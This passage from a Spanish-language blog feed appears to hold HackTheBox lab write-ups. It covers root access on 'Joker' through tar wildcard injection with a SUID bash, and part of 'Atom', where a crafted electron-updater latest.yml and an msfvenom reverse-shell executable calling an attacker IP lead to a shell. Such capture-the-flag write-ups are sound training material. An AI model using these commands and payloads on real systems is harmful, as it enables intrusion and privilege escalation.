ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYvqYRwqRrHydQfmmP56U9Wkec5IS2odMcoFxXppd5IPdzzf6CIv3skuKorlyi8HZCbsHnhm57Fqzn3PZWZ7pp5rgFzTPneh4a4W7NJONRxsuRwT4SWWNzmSjINyQrWurhctekrh3rRuhDwtSIz9rTjFKNCsmTbk6Qm3Fx3+JfYuKhuq4lNwSo3QqU2+yNv+svzzs66sdq+E/2Z0bhoi5bubhwj5g739A5odh57Hey9AfNtsK9vcVOpL+yH9RAwNHfRSHxM8GJrInMc3Twb9a8FQ8MSNO7gXd2+ykRqP0L8TkNJMggNTpmCZctL7a1wJHbTjcj68JO9nmFJgyh0BZQ8wlQetcDgo0yQ3jIhoIvN7GzPyJbo5X3cFhw/2gXSxWVLRwk6e7RQELp2SZeEFXN6ycimU4tbWEOrexJO2VwZQp8ZWv46ffUj4c4jYAiZ81i3wVJoko0uLcE9KENb/0E+9dnx5uMLUDNXz8x9EFwOkN1qxD3skGtR3dXMFZFRKM= root@fmiracle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De este modo ahora podemos conectarnos como el usuario &lt;code&gt;alekos&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh alekos@10.10.10.21
The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
ECDSA key fingerprint is SHA256:1yj4blzJwO5TYIZYFB3HMwXEqeflHc2iF1Idp3lZ94k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.21' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
alekos@joker:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos dirigirnos a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~$ ls
backup  development  user.txt
alekos@joker:~$ cat user.txt 
fcbfa16ff0623562479c4a6a7e4897ba
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listando el contenido del directorio de &lt;code&gt;alekos&lt;/code&gt;, vemos dos directorio uno de &lt;code&gt;development&lt;/code&gt; el cual contiene scripts en &lt;code&gt;python&lt;/code&gt; y el directorio &lt;code&gt;backup&lt;/code&gt; el cual contiene archivos comprimidos con &lt;code&gt;tar&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~$ ls
backup  development  user.txt
alekos@joker:~$ cd development/
alekos@joker:~/development$ ls
__init__.py  application.py  data  models.py  static  templates  utils.py  views.py
alekos@joker:~/development$ cd ..
alekos@joker:~$ cd backup/
alekos@joker:~/backup$ ls
dev-1514134201.tar.gz  dev-1693005901.tar.gz  dev-1693006801.tar.gz  dev-1693007701.tar.gz  dev-1693008601.tar.gz  dev-1693009501.tar.gz  dev-1693010402.tar.gz
dev-1514134501.tar.gz  dev-1693006201.tar.gz  dev-1693007101.tar.gz  dev-1693008001.tar.gz  dev-1693008902.tar.gz  dev-1693009801.tar.gz  dev-1693010701.tar.gz
dev-1693005601.tar.gz  dev-1693006501.tar.gz  dev-1693007401.tar.gz  dev-1693008301.tar.gz  dev-1693009201.tar.gz  dev-1693010101.tar.gz  dev-1693011002.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si descomprimimos alguno de los comprimidos, obsevamos que dentro de este vemos los mismos archivos que se encontraban en la ruta &lt;code&gt;development&lt;/code&gt;. Podemos intuir entonces que mediante una tarea que se ejecuta a intervalos regulares de tiempo, se esta comprimiendo todo el contenido del directorio &lt;code&gt;development&lt;/code&gt; y lo esta almancenando en &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/backup$ cp dev-1514134201.tar.gz /tmp/
alekos@joker:~/backup$ cd /tmp/
alekos@joker:/tmp$ ls
dev-1514134201.tar.gz  f  systemd-private-67c5a0aba61c4233b0464cb22f25c7cb-systemd-timesyncd.service-5cvsvV  vmware-root
alekos@joker:/tmp$ mkdir test
alekos@joker:/tmp$ cd test/
alekos@joker:/tmp/test$ mv ../dev-1514134201.tar.gz .
alekos@joker:/tmp/test$ tar -xf dev-1514134201.tar.gz 
alekos@joker:/tmp/test$ ls
__init__.py  application.py  data  dev-1514134201.tar.gz  models.py  static  templates  utils.py  views.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Viendo esto lo mas probable es que se este usando &lt;code&gt;tar&lt;/code&gt;, ejecutandolo de esta manera &lt;code&gt;tar -cf /development/*&lt;/code&gt; y dado el caso podriamos aprovechar el uso de Wildcards y tratar de obtener una shell.&lt;/p&gt;

&lt;p&gt;Si usamos nuestra web de confianza:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/#shell&quot;&gt;https://gtfobins.github.io/gtfobins/tar/#shell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vemos que para obtener una shell, podemos hacerlo con los siguientes parametros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y como se esta utilizando Wildcards, podemos crearnos dos archivos de nombre &lt;code&gt;--checkpoint=1&lt;/code&gt; y &lt;code&gt;--checkpoint-action=exec=EJECUTA LO QUE QUIERAS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello al crear los archivos que contienen &lt;code&gt;-&lt;/code&gt;, debemos anteponer &lt;code&gt;--&lt;/code&gt; para hacerlo correctamente.&lt;/p&gt;

&lt;p&gt;En el segundo archivo que corresponde a la ejecución, voy a crearme un archivo en python el cual otorgue el permiso &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;alekos@joker:~/development$ cat abusing_wildcard.py 
import os

os.system(&quot;chmod u+s /bin/bash&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y seguidamente voy a crear los dos archivos necesarios, de modo que al ejecutarse el comando &lt;code&gt;tar&lt;/code&gt; sobre todos los archivos tomara los nombres de estos dos ultimos como parametros y en consecuencia ejecutara el comando asignado, otorgando el privilegio &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/development$ touch -- --checkpoint=1
alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python abusing_wildcard.py'
alekos@joker:~/development$ ls -l
total 32
-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:05 --checkpoint-action=exec=python abusing_wildcard.py
-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:04 --checkpoint=1
-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py
-rw-rw-r-- 1 alekos alekos   44 Aug 26 04:07 abusing_wildcard.py
-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py
drwxrwx--- 2 alekos alekos 4096 May 18  2017 data
-rw-r----- 1 alekos alekos  997 May 18  2017 models.py
drwxr-x--- 2 alekos alekos 4096 May 18  2017 static
drwxr-x--- 2 alekos alekos 4096 May 18  2017 templates
-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py
-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pasado unos minutos listamos la bash y vemos que se le dio el permiso correspondiente de manera exitosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/development$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1041576 May 16  2017 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente lo que nos quedaria por hacer es convertimos como el usuario &lt;code&gt;root&lt;/code&gt; y leer la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/development$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root/
bash-4.3# cat root.txt 
bash-4.3# cat root.txt 
90fcbcbbb01891eec43448b6b6d7051b
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Fri, 25 Aug 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Joker</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Joker</guid>
        
        <category>SQUID Proxy Enumeration</category>
        
        <category>UDP Enumeration</category>
        
        <category>Abusing TFTP</category>
        
        <category>Getting Squid Proxy Credentials</category>
        
        <category>Cracking Hashes</category>
        
        <category>Internal port discovery via SQUID Proxy</category>
        
        <category>Abusing Interactive Console</category>
        
        <category>RCE Bypassing iptables rules</category>
        
        <category>UDP Reverse Shell</category>
        
        <category>Abusing Sudoers Privilege</category>
        
        <category>Abusing sudoedit</category>
        
        <category>Abusing Cron Job</category>
        
        <category>Abusing TAR Wildcards</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Atom - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Atom&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves &lt;code&gt;electron-builder&lt;/code&gt; donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de &lt;code&gt;portablekanban&lt;/code&gt; y finalmente despues de una enumeración del servicio de &lt;code&gt;redis&lt;/code&gt; obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Atom
❯ ls

 Atom
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.237
PING 10.10.10.237 (10.10.10.237) 56(84) bytes of data.
64 bytes from 10.10.10.237: icmp_seq=1 ttl=127 time=271 ms

--- 10.10.10.237 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 271.205/271.205/271.205/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.237 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:35 GMT
Initiating SYN Stealth Scan at 00:35
Scanning 10.10.10.237 [65535 ports]
Discovered open port 445/tcp on 10.10.10.237
Discovered open port 80/tcp on 10.10.10.237
Discovered open port 135/tcp on 10.10.10.237
Discovered open port 443/tcp on 10.10.10.237
Discovered open port 6379/tcp on 10.10.10.237
Discovered open port 5985/tcp on 10.10.10.237
Completed SYN Stealth Scan at 00:35, 26.77s elapsed (65535 total ports)
Nmap scan report for 10.10.10.237
Host is up, received user-set (0.20s latency).
Scanned at 2023-08-11 00:35:14 GMT for 27s
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
443/tcp  open  https        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
6379/tcp open  redis        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 23 (1.012KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,135,443,445,5985,6379 10.10.10.237 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:36 GMT
Nmap scan report for 10.10.10.237
Host is up (0.21s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Heed Solutions
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m32s, median: -1s
| smb2-time: 
|   date: 2023-08-11T00:37:09
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-10T17:37:13-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;443&lt;/td&gt;
      &lt;td&gt;HTTPS&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;microsoft-ds Windows 10 Pro 19042&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6379&lt;/td&gt;
      &lt;td&gt;REDIS&lt;/td&gt;
      &lt;td&gt;Redis key-value store&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb 10.10.10.237
http://10.10.10.237 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.237], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta que estamos ante un &lt;code&gt;php&lt;/code&gt;, y si procedemos a abrir el servicio en el navegador vemos que pagina hace referencia a &lt;code&gt;heed Solutions&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora bien &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;445&lt;/code&gt; se encuentra abierto, asi que vamos a tratar de enumerar si existen recursos compartidos. Para ello usaremos &lt;code&gt;smbmap&lt;/code&gt; de la suite de &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null'
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Software_Updates                                  	READ, WRITE	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que tenemos permiso de lectura y ejecución en &lt;code&gt;Software_Updates&lt;/code&gt;, asi que vamos a listar los recursos que contiene.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null' -r 'Software_Updates'
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Software_Updates                                  	READ, WRITE	
	.\Software_Updates\*
	dr--r--r--                0 Fri Aug 11 00:51:43 2023	.
	dr--r--r--                0 Fri Aug 11 00:51:43 2023	..
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client1
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client2
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client3
	fr--r--r--            35202 Fri Apr  9 11:18:08 2021	UAT_Testing_Procedures.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a traernos a nuestra maquina y abrir el archivo pdf.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null' --download 'Software_Updates/UAT_Testing_Procedures.pdf'
[+] Starting download: Software_Updates\UAT_Testing_Procedures.pdf (35202 bytes)
[+] File output to: /home/fmiracle/Machines/Aton/content/10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
❯ ls
 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
❯ mv 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf UAT_Testing_Procedures.pdf
❯ ls
 UAT_Testing_Procedures.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si lo queremos ver en nuestro navegador, yo voy a compartirme un servicio web con &lt;code&gt;php&lt;/code&gt;, pero tu puedes hacerlo como mas te guste.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php -S 0.0.0.0:80
[Fri Aug 11 00:56:38 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que contiene información acerca de una aplicación en &lt;code&gt;electron-builder&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Si bajamos un poco observamos qmas información donde nos dice que para iniciar el proceso QA debemos de poner las actualizaciones en uno de los directorios con el nombre &lt;code&gt;client&lt;/code&gt; que curiosamente son los mismo cuando listamos los recursos compartidos con &lt;code&gt;smbmap&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Electron - builder : Una solución completa para empaquetar y crear una aplicación Electron lista para su distribución para macOS, Windows y Linux con soporte de “actualización automática”.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si buscamos vulnerabilidades asociadas a &lt;code&gt;electron builder&lt;/code&gt;, encontramos  una de evasión de la validación de firmas que conduce a &lt;code&gt;RCE&lt;/code&gt; en Electron-Updater.&lt;/p&gt;

&lt;p&gt;Basicamente esta vulnerabilidad se aprovecha de &lt;code&gt;Electron-Updater&lt;/code&gt; y nos permite ejecutar codigo malicioso en el software.&lt;/p&gt;

&lt;p&gt;Te dejo el articulo para que puedas entenderlo mejor:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&quot;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder explotarla vamos a utilizar una estructura similar a la que nos comparten en el articulo y le pondremos la extensión &lt;code&gt;yml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;version: 1.2.3
path: http://10.10.16.2/test
sha512: fjqwiofhqw21321 21ie21e2r
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la parte de &lt;code&gt;path&lt;/code&gt; vamos a indicarle que al ejecutarse realize una petición a nuestra ip, donde nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt;. Y seguidamente vamos a subir en una de las carpetas &lt;code&gt;client&lt;/code&gt; nuestro archivo &lt;code&gt;yaml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbclient  //10.10.10.237/Software_Updates -N
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; dir
  .                                   D        0  Fri Aug 11 01:18:55 2023
  ..                                  D        0  Fri Aug 11 01:18:55 2023
  client1                             D        0  Fri Aug 11 01:18:55 2023
  client2                             D        0  Fri Aug 11 01:18:55 2023
  client3                             D        0  Fri Aug 11 01:18:55 2023
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 11:18:08 2021

		4413951 blocks of size 4096. 1369525 blocks available
smb: \&amp;gt; cd client1
smb: \client1\&amp;gt; put latest.yml
putting file latest.yml as \client1\latest.yml (0,1 kb/s) (average 0,1 kb/s)
smb: \client1\&amp;gt; dir
  .                                   D        0  Fri Aug 11 01:21:33 2023
  ..                                  D        0  Fri Aug 11 01:21:33 2023
  latest.yml                          A       79  Fri Aug 11 01:21:33 2023

		4413951 blocks of size 4096. 1369525 blocks available
smb: \client1\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de unos segundos recibimos la conexión, lo cual nos garantiza que efectivamente estamos aprovechandonos de la vulnerabilidad.&lt;/p&gt;

&lt;p&gt;Lo que vamos a hacer ahora es crearnos un ejecutable malicioso con la ayuda de &lt;code&gt;msfvenom&lt;/code&gt; para poder obtener una reverse shell de la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una cosa a recalcar que como nos dice el articulo el archivo debemos de llamarlo de una forma especial usando el simbolo &lt;code&gt;’&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mv reverse.exe r’everse.exe
❯ ls
 latest.yml   r’everse.exe   UAT_Testing_Procedures.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ademas debemos de modificar nuestro archivo &lt;code&gt;yml&lt;/code&gt; especificando en el path el archivo y no olvidemos incluir el sha512 del ejecutable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ sha512sum r’everse.exe
d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31  r’everse.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El archivo nos quedaria de la siguiente forma:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;version: 1.2.3
path: r’everse.exe 
sha512: d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Procedemos a subirlo en una de las carpetas &lt;code&gt;client&lt;/code&gt;, compartimos el ejecutable desde nuestra maquina con python y nos ponemos en escucha en el puerto establecido con &lt;code&gt;ncat&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Recibimos la conexión como el usuario &lt;code&gt;jason&lt;/code&gt;.&lt;/p&gt;

